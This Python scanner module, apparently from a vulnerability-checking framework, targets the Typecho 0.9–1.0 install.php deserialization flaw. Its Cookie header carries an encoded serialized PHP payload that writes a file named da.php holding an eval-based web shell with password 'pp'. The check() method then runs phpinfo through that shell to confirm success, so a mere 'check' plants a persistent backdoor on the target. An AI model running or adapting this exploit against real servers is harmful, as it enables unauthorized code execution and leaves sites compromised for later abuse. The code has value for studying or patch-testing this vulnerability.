#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class Typecho_Install_Code_Exec_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'typecho install.php反序列化命令执行漏洞',
            'description': 'typecho install.php反序列化命令执行漏洞,影响范围为: Typecho Typecho 0.9~1.0',
            'date': '2017-11-06',
            'exptype': 'check',
            'type': 'Serializable'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent(),
            "Cookie": "__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTY6ImZpbGVfcHV0X2NvbnRlbnRzKCdkYS5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbcHBdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9",
            "Referer": self.url + "/install.php",
        }

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_url = self.url + "/install.php?finish=1"
            req = await request.get(check_url, headers = self.headers)
            shellpath = self.url + "/da.php"
            post_data ={
                "pp":"phpinfo();"
            }
            check_req = await request.post(self.url + "/da.php", data = post_data, headers = self.headers)
            if r"Configuration File (php.ini) Path" in await check_req.text():
                # print("存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: " + check_url + "\tshell地址: " + shellpath + "\t密码: pp")
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == "__main__":
    Typecho_Install_Code_Exec = Typecho_Install_Code_Exec_BaseVerify('https://127.0.0.1')
    Typecho_Install_Code_Exec.check()